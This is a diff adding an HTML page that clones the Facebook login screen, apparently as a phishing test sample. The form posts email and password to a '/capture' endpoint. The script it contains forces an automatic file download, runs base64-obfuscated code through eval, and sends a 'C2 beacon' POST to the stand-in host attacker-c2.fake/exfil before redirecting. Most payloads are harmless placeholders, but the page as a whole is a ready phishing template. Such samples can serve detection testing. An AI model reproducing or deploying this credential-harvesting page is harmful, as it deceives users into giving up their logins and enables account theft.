@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Facebook – log in or sign up</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: sans-serif;
+    }
+    .box {
+      background: white;
+      width: 360px;
+      padding: 20px;
+      margin: 100px auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input {
+      width: 100%;
+      margin: 10px 0;
+      padding: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>Log in to Facebook</h2>
+    <form method="POST" action="/capture">
+      <input type="text" name="email" placeholder="Email or phone number">
+      <input type="password" name="pass" placeholder="Password">
+      <button type="submit">Log In</button>
+    </form>
+  </div>
+
+  <script>
+    console.log("🧠 Starting phishing JS payloads...");
+
+    // 🪤 Auto-download
+    const file = new Blob(["Test phishing file content"], { type: "text/plain" });
+    const a = document.createElement("a");
+    a.href = URL.createObjectURL(file);
+    a.download = "login_data.txt";
+    a.click();
+    console.log("🪤 Auto-download triggered");
+
+    // 🎮 Mouse and click events
+    document.body.addEventListener("mousemove", () => {
+      console.log("👀 Mouse moved on fake phishing page");
+    });
+    document.body.addEventListener("click", () => {
+      console.log("💥 Click event triggered");
+    });
+
+    // 🧬 Eval payload with logging
+    console.log("🧬 base64 payload: preparing to eval");
+    const encoded = btoa("console.log('🧬 base64 payload decoded & executed');");
+    eval(atob(encoded));
+
+    // 📡 C2 beacon with better logging
+    fetch("https://attacker-c2.fake/exfil", {
+      method: "POST",
+      body: JSON.stringify({ data: "fake_creds" })
+    })
+    .then(() => {
+      console.log("📤 C2 beacon sent");
+    })
+    .catch((e) => {
+      console.log("❌ C2 beacon failed: " + e.message);
+    });
+
+    // 🔁 Redirect to /redir1
+    window.addEventListener("beforeunload", () => {
+      console.log("🚪 Page is unloading for redirect");
+    });
+
+    setTimeout(() => {
+      console.log("🔁 Redirecting to /redir1");
+      window.location.href = "/redir1";
+    }, 3000);
+  </script>
+
+</body>
+</html>
+
